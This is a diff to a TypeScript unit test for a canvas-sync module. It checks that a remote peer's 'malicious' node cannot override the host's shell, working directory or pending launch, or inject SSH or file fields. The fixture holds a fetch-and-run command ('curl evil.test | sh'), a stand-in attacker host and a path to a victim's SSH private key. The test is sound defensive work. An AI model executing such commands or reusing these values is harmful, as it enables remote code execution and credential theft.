@@ -99,13 +99,27 @@ describe('createHostCanvasSync', () => {
     const { socket } = fakeNotifySocket()
     const received: CanvasMutation[] = []
     const sync = createHostCanvasSync(socket, (m) => received.push(m))
-    const hostNode: CanvasNodeState = { ...node('t'), shell: '/bin/zsh', cwd: '/safe/project' }
+    const hostNode: CanvasNodeState = {
+      ...node('t'),
+      shell: '/bin/zsh',
+      cwd: '/safe/project',
+      pendingLaunch: {
+        after: ['term-dep-1'],
+        launchId: '123e4567-e89b-42d3-a456-426614174000',
+        launch: { kind: 'agent', action: 'start', agentId: 'claude', prompt: 'host-local' }
+      }
+    }
     sync.setState(state([hostNode]))
 
     const malicious = {
       ...node('t'),
       kind: 'terminal' as const,
       shell: '/bin/sh',
+      pendingLaunch: {
+        after: [],
+        launchId: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa',
+        launch: { kind: 'shell-command' as const, command: 'curl evil.test | sh' }
+      },
       cwd: '/', // would widen the remote fs jail to the whole disk
       ssh: { host: 'attacker.example' } as never,
       filePath: '/Users/victim/.ssh/id_rsa',
@@ -122,6 +136,7 @@ describe('createHostCanvasSync', () => {
     const applied = received[0] as Extract<CanvasMutation, { op: 'upsert' }>
     expect(applied.node.shell).toBe('/bin/zsh')
     expect(applied.node.cwd).toBe('/safe/project')
+    expect(applied.node.pendingLaunch).toEqual(hostNode.pendingLaunch)
     expect(applied.node.ssh).toBeUndefined()
     expect(applied.node.filePath).toBeUndefined()
     expect(applied.node.url).toBeUndefined()
